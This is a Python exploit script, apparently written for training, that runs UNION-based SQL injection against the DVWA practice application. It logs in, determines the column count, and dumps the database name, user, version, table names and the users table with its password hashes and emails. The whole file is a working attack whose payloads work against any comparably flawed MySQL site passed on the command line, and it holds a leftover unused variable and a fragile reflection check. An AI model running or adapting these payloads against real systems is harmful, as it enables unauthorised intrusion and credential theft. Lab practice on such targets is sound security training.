#!/usr/bin/env python3
"""
UNION-Based SQL Injection - DVWA Exploitation
Author: Afiq
Date: July 2026
Target: http://localhost/vulnerabilities/sqli/?id=
Security Level: Low/Medium/High (auto-adjusts)
"""

import requests
import sys
import re
from bs4 import BeautifulSoup

class DVWASQLi:
    def __init__(self, target_url="http://localhost/dvwa", 
                 username="admin", password="password"):
        self.target = target_url.rstrip('/')
        self.session = requests.Session()
        self.username = username
        self.password = password
        self.logged_in = False
        
    def login(self):
        """Authenticate to DVWA"""
        print("[*] Authenticating to DVWA...")
        
        login_url = f"{self.target}/login.php"
        
        # Get CSRF token
        r = self.session.get(login_url)
        soup = BeautifulSoup(r.text, 'html.parser')
        token_input = soup.find('input', {'name': 'user_token'})
        
        if not token_input:
            print("[-] Could not find CSRF token")
            return False
            
        csrf_token = token_input.get('value')
        
        # Login
        login_data = {
            'username': self.username,
            'password': self.password,
            'user_token': csrf_token,
            'Login': 'Login'
        }
        
        r = self.session.post(login_url, data=login_data)
        
        if "Logout" in r.text:
            print("[+] Authentication successful!")
            self.logged_in = True
            return True
        else:
            print("[-] Authentication failed")
            return False
    
    def exploit_union(self, param_id=1):
        """UNION-based SQL injection"""
        
        if not self.logged_in and not self.login():
            return None
        
        sqli_url = f"{self.target}/vulnerabilities/sqli/"
        
        print("\n[*] Starting UNION-based SQL injection...")
        print(f"[*] Target: {sqli_url}")
        
        # Step 1: Determine column count
        print("\n[*] Step 1: Determining column count...")
        cols = None  # Explicit init to avoid UnboundLocalError in later scope
        for i in range(1, 10):
            payload = f"{param_id} ORDER BY {i}-- "
            r = self.session.get(sqli_url, params={'id': payload})

            # ORDER BY n succeeds when n column exists.
            # ORDER BY (n+1) fails → MySQL "Unknown column" error in body.
            if "Unknown column" in r.text or "unknown column" in r.text.lower():
                cols = i - 1
                print(f"[+] Found {cols} columns")
                break

        if cols is None:
            print("[-] Could not determine column count")
            return None

        # Step 2: Find reflective columns
        print("\n[*] Step 2: Finding reflective columns...")
        union_cols = []
        cols_list = ','.join(str(j) for j in range(1, cols + 1))
        union_payload = f"{param_id} UNION SELECT {cols_list}-- "
        r = self.session.get(sqli_url, params={'id': union_payload})

        # A column is reflective only if its injected value appears OUTSIDE
        # the original row context. Stricter check: regex on <pre> block + must
        # not appear in baseline (id=1) response.
        baseline = self.session.get(sqli_url, params={'id': str(param_id)}).text
        pre_match = re.search(r'<pre[^>]*>(.*?)</pre>', r.text, re.DOTALL)
        if pre_match:
            block = pre_match.group(1)
            for i in range(1, cols + 1):
                # Look for isolated " i" or "<i>" patterns indicating reflection
                if re.search(rf'\b{i}\b', block) and not re.search(rf'\b{i}\b', baseline):
                    union_cols.append(i)

        if not union_cols:
            print("[-] Could not find reflective columns")
            return None

        print(f"[+] Reflective columns: {union_cols}")
        col_idx = union_cols[0]
        # Use col_idx in payloads (was unused after assignment — bug in extraction step)
        
        # Step 3: Extract basic info
        results = {}
        
        print("\n[*] Step 3: Extracting database information...")
        
        # Database name
        payload = f"{param_id} UNION SELECT database()," + ",".join("2" for _ in range(cols-1)) + "-- "
        r = self.session.get(sqli_url, params={'id': payload})
        match = re.search(r'<pre[^>]*>(.*?)</pre>', r.text, re.DOTALL)
        if match:
            db_name = match.group(1).split('\n')[0].strip()
            results['database'] = db_name
            print(f"[+] Database: {db_name}")
        
        # Current user
        payload = f"{param_id} UNION SELECT user()," + ",".join("2" for _ in range(cols-1)) + "-- "
        r = self.session.get(sqli_url, params={'id': payload})
        match = re.search(r'<pre[^>]*>(.*?)</pre>', r.text, re.DOTALL)
        if match:
            user = match.group(1).split('\n')[0].strip()
            results['user'] = user
            print(f"[+] Current User: {user}")
        
        # Version
        payload = f"{param_id} UNION SELECT version()," + ",".join("2" for _ in range(cols-1)) + "-- "
        r = self.session.get(sqli_url, params={'id': payload})
        match = re.search(r'<pre[^>]*>(.*?)</pre>', r.text, re.DOTALL)
        if match:
            version = match.group(1).split('\n')[0].strip()
            results['version'] = version
            print(f"[+] Version: {version}")
        
        # Step 4: Extract tables
        print("\n[*] Step 4: Enumerating tables...")
        payload = f"{param_id} UNION SELECT GROUP_CONCAT(table_name)," + ",".join("2" for _ in range(cols-1)) + \
                  " FROM information_schema.tables WHERE table_schema=database()-- "
        r = self.session.get(sqli_url, params={'id': payload})
        match = re.search(r'<pre[^>]*>(.*?)</pre>', r.text, re.DOTALL)
        if match:
            tables = match.group(1).split('\n')[0].strip().split(',')
            results['tables'] = tables
            print(f"[+] Tables: {', '.join(tables)}")
        
        # Step 5: Extract users
        if 'users' in results.get('tables', []):
            print("\n[*] Step 5: Extracting users table...")
            
            payload = f"{param_id} UNION SELECT " + \
                     "GROUP_CONCAT(CONCAT(user_id,' | ',user,' | ',password,' | ',email) SEPARATOR ' | ')," + \
                     ",".join("2" for _ in range(cols-1)) + \
                     " FROM users-- "
            
            r = self.session.get(sqli_url, params={'id': payload})
            match = re.search(r'<pre[^>]*>(.*?)</pre>', r.text, re.DOTALL)
            
            if match:
                users_data = match.group(1).strip()
                print(f"[+] Users extracted:\n{users_data}")
                results['users'] = users_data
        
        return results


def main():
    print("""
    ╔════════════════════════════════════════════╗
    ║   DVWA UNION-Based SQLi Exploitation       ║
    ║   Author: Afiq | Date: July 2026           ║
    ╚════════════════════════════════════════════╝
    """)
    
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost/dvwa"
    
    exploit = DVWASQLi(target)
    
    if exploit.login():
        results = exploit.exploit_union()
        
        if results:
            print("\n" + "="*60)
            print("EXPLOITATION COMPLETE")
            print("="*60)
            for key, value in results.items():
                print(f"\n[+] {key.upper()}:")
                if isinstance(value, list):
                    for item in value:
                        print(f"    - {item}")
                else:
                    print(f"    {value}")
    else:
        print("[-] Failed to authenticate")
        sys.exit(1)


if __name__ == "__main__":
    main()
